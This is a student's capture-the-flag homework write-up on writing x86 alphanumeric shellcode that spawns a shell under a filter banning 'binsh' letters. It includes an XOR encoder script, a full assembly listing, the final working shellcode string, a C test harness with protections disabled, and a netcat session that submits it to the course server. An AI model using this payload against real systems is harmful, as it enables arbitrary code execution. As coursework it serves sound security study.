# Write up: alnum (1-2)

## ymli (0016045)

## our task

Our task is writing a shell code with only Alphanumeric opcodes [1].


## filtering

In order to prevent students cheating with existing tools, Jaffxx filtered out 12 opcodes: "binsh" and "BINSH".

Lots of important instructions are unavailable now.

```
B inc edx
I dec ecx
N dec esi
S push ebx
H dec eax

i imul r32, [m32], i32
s jae i8
h push i32
```

## opcode encoder

After some studying on the internet, I found a Japanese hacker's note about encoding arbitrary x86 shell code in AlphaNumeric format [2].

It's a simplified version of Alpha3 [3].

I tried to read and understand the encoding and modified his scripts ... but failed to write a decoder for it ... gave up.

## think in pure alnum opcodes

After my freaking differential equations midterm, I tried to think in pure Alphanumeric assembly codes.

The same hacker had posted another note about it [4].

It started with a very simple shell code


```
        /* test.s */
        .intel_syntax noprefix
        .globl _start
_start:
        push 0x80cd0b42
        push 0x8de18953
        push 0x52e3896e
        push 0x69622f68
        push 0x68732f2f
        push 0x6852d231
        jmp esp
```

The second step is replacing these hex codes to alnum_encoder format ... with some xor tricks.

This guy wrote a python script `decomposite.py` to figure out the decomposition of the hex code.

For instance, `0x80cd0b42 が 0x30413230 ^ 0x4f733972 ^ 0xffff0000`.

I modified the script to filter out some instructions of this homework.

```
#!/usr/bin/python2
# decomposite.py
# from: http://inaz2.hatenablog.com/entry/2014/07/13/025626

import sys
import struct

word = int(sys.argv[1], 16)

allowed = range(0x30, 0x3a) + range(0x41, 0x5b) + range(0x61, 0x7b)

# XXX: no "binsh" or "BINSH"
for c in [ ord(_) for _ in "binshBINSH" ]:
    allowed.remove(c)

chunk = struct.pack('<I', word)
x = ''
y = ''
z = ''

for c in map(ord, chunk):
    if c >= 0x80:
        z += '\xff'
        c ^= 0xff
    else:
        z += '\x00'
    for i in allowed:
        if i^c in allowed:
            x += chr(i)
            y += chr(i^c)
            break

print hex(struct.unpack('<I', x)[0])
print hex(struct.unpack('<I', y)[0])
print hex(struct.unpack('<I', z)[0])
```

I replaced these hex codes.

```
-------------------
old xor eax, 0x30413230
    xor eax, 0x4f733972

new xor eax, 0x30433230
    xor eax, 0x4f713972
    -------------------
    xor eax, 0x30443030
    xor eax, 0x425a4663

    xor eax, 0x31443030
    xor eax, 0x435a4663
    -------------------
    xor eax, 0x30443034
    xor eax, 0x6258465a

    xor eax, 0x31443034
    xor eax, 0x6358465a
    -------------------
    xor eax, 0x30304130
    xor eax, 0x59526e58

    xor eax, 0x30304330
    xor eax, 0x59526c58
    -------------------
    xor eax, 0x30304141
    xor eax, 0x58436e6e

    xor eax, 0x30304343
    xor eax, 0x58436c6c
    -------------------
    xor eax, 0x30304141
    xor eax, 0x58626c70

    xor eax, 0x30314141
    xor eax, 0x58636c70
```


Looks great, we have no `push ebx` this time! It's actually the same as `push 0x0`

```
/* test.s */
    .intel_syntax noprefix
    .globl _start

_start:
    push 0x30
    pop eax
    xor al, 0x30
    push eax
    push eax
    push eax  /* edx = 0 */
    push eax  /* ebx = 0 */
    push eax
    push eax
    push eax
    push eax
    popad
    dec edx   /* edx = 0xffffffff */

    /* push 0x80cd0b42 */
    push edx
    pop eax
    xor eax, 0x30433230
    xor eax, 0x4f713972
    push eax
    push esp
    pop ecx
    xor [ecx], dh
    inc ecx
    xor [ecx], dh

    /* push 0x8de18953 */
    push edx
    pop eax
    xor eax, 0x31443030
    xor eax, 0x435a4663
    push eax
    push esp
    pop ecx
    xor [ecx], dh

    /* push 0x52e3896e */
    push 0x0
    pop eax
    xor eax, 0x31443034
    xor eax, 0x6358465a
    push eax
    push esp
    pop ecx
    inc ecx
    xor [ecx], dh
    inc ecx
    xor [ecx], dh

    /* push 0x69622f68 */
    push 0x0
    pop eax
    xor eax, 0x30304330
    xor eax, 0x59526c58
    push eax

    /* push 0x68732f2f */
    push 0x0
    pop eax
    xor eax, 0x30304343
    xor eax, 0x58436c6c
    push eax

    /* push 0x6852d231 */
    push 0x0
    pop eax
    xor eax, 0x30314141
    xor eax, 0x58636c70
    push eax
    push esp
    pop ecx
    inc ecx
    xor [ecx], dh

    jmp esp
```

Well, `push 0x0` is still invalid ... since edx contains 0xffffffff, we can play some tricks on it.

```
    push edx    ; mov ecx, edx
    pop ecx
    inc ecx
    push ecx    ; now ecx = 0, push it!
```


Okay, everything looks great except `jmp esp`, it's still non alphanumeric.

In the blog post, this guy replaced `jmp esp` with `push esp; ret`.

Here's another xor trick on it, we try to make a literal `0xc3 (ret)` byte data on the stack.

`0x44 ^ 0x78 ^ 0xff == 0xc3 (ret)`, we make a literal byte data as a placeholder of `0xc3 (ret)`,

try to access that part of memory and xor it with (0x44 ^ 0xff)

Also, the original code doesn't work, we have to patch it because we don't have `dec ecx` this time.


```

 /* set buffer register to ecx */
    push eax
    pop ecx

    push edx
    pop eax
    xor al, 0x44
    push 0x30
    pop ecx
    dec ecx
    dec ecx
    dec ecx
    dec ecx
    dec ecx
    xor [esi+2*ecx+0x30], al

    (push stuffs on the stack)

ret:
    .byte 0x78
```

I used `edx` instead of `ecx`, and added a dummy push/pop pair to adjust the length of the shellcode.

```
    push edx
    pop eax
    xor al, 0x44
    push edx
    push 0x30
    pop edx
    push edx
    pop edx
    xor [esi+edx*2+0x31], al
    pop edx
```

The full listing of my shellcode:

```
       /* alnum.s */
        .intel_syntax noprefix
        .globl _start
_start:
        /* set buffer register to ecx */
        push eax
        pop ecx

prepare_registers:
        push 0x30
        pop eax
        xor al, 0x30
                  /* omit eax, ecx */
        push eax  /* edx = 0 */
        push eax  /* ebx = 0 */
        push eax
        push eax
        push ecx  /* esi = buffer */
        push eax
        popad
        dec edx   /* edx = 0xffffffff */

patch_ret:
        /* 0x44 ^ 0x78 ^ 0xff == 0xc3 (ret) */
        push edx
        pop eax
        xor al, 0x44
        push edx
        push 0x30
        pop edx
        push edx
        pop edx
        xor [esi+edx*2+0x31], al
        pop edx

build_stack:
        /* push 0x80cd0b42 */
        push edx
        pop eax
        xor eax, 0x30433230
        xor eax, 0x4f713972
        push eax
        push esp
        pop ecx
        xor [ecx], dh
        inc ecx
        xor [ecx], dh

        /* push 0x8de18953 */
        push edx
        pop eax
        xor eax, 0x31443030
        xor eax, 0x435a4663
        push eax
        push esp
        pop ecx
        xor [ecx], dh

        /* push 0x52e3896e */
        push edx
        pop ecx
        inc ecx
        push ecx
        pop eax
        xor eax, 0x31443034
        xor eax, 0x6358465a
        push eax
        push esp
        pop ecx
        inc ecx
        xor [ecx], dh
        inc ecx
        xor [ecx], dh

        /* push 0x69622f68 */
        push edx
        pop ecx
        inc ecx
        push ecx
        pop eax
        xor eax, 0x30304330
        xor eax, 0x59526c58
        push eax

        /* push 0x68732f2f */
        push edx
        pop ecx
        inc ecx
        push ecx
        pop eax
        xor eax, 0x30304343
        xor eax, 0x58436c6c
        push eax

        /* push 0x6852d231 */
        push edx
        pop ecx
        inc ecx
        push ecx
        pop eax
        xor eax, 0x30314141
        xor eax, 0x58636c70
        push eax
        push esp
        pop ecx
        inc ecx
        xor [ecx], dh

        push esp

ret:
        .byte 0x78

```

## testing

Compile the assembly code to an object file and extract the alphanumeric shellcode.

```
$ gcc -m32 -nostdlib test.s
$ strings a.out
PYj0X40PPPPQPaJRX4DRj0ZRZ0DV1ZRX502C05r9qOPTY01A01RX500D15cFZCPTY01RYAQX540D15ZFXcPTYA01A01RYAQX50C005XlRYPRYAQX5CC005llCXPRYAQX5AA105plcXPTYA01Tx
```

Make sure no invalid opcodes inside.

```
In [121]: [ c in "PYj0X40PPPPQPaJRX4DRj0ZRZ0DV1ZRX502C05r9qOPTY01A01RX500D15cFZCPTY01RYAQX540D15ZFXcPTYA01A01RYAQX50C005XlRYPRYAQX5CC005llCXPRYAQX5AA105plcXPTYA01Tx" for c in "binshBINSH" ]
Out[121]: [False, False, False, False, False, False, False, False, False, False]
```

Make a test in C.

```
int main (void) {
    char shellcode[] = "PYj0X40PPPPQPaJRX4DRj0ZRZ0DV1ZRX502C05r9qOPTY01A01RX500D15cFZCPTY01RYAQX540D15ZFXcPTYA01A01RYAQX50C005XlRYPRYAQX5CC005llCXPRYAQX5AA105plcXPTYA01Tx";
    (*(void  (*)()) shellcode)();
}
```

Looks fine.

```

$ gcc -m32 -fno-stack-protector -z execstack a.c
$ ./a.out
sh-4.3$ exit
```


## capture the flag

```
$ nc secprog.cs.nctu.edu.tw 20001
Welcome to AlphaNumeric Shellcode executor!
You can only use 0-9 A-Z a-z.
"BINSH" and "binsh" are filter out.

Please input your shellcode: PYj0X40PPPPQPaJRX4DRj0ZRZ0DV1ZRX502C05r9qOPTY01A01RX500D15cFZCPTY01RYAQX540D15ZFXcPTYA01A01RYAQX50C005XlRYPRYAQX5CC005llCXPRYAQX5AA105plcXPTYA01Tx
cat /home/alnum/flag
SECPROG{IncredibleASMProgrammer}
```

## lessons learned

Writing asm codes is pretty fun (read: painful)!

I use several tools help me do the job, including gdb/xxd/odjdump and [5].

This homework made me learn more about x86 asm code, thanks!



## Reference

1. [Alphanumeric/x86 printable opcodes](http://skypher.com/wiki/index.php?title=Hacking/Shellcode/Alphanumeric/x86_printable_opcodes)
2. [x86 alphanumeric shellcode encoderを書いてみる](http://inaz2.hatenablog.com/entry/2014/07/13/025626)
3. [Alpha3](https://code.google.com/p/alpha3/)
4. [x86 alphanumeric shellcodeを書いてみる](http://inaz2.hatenablog.com/entry/2014/07/11/004655)
5. [Defuse online x86/x64 assembler](https://defuse.ca/online-x86-assembler.htm)
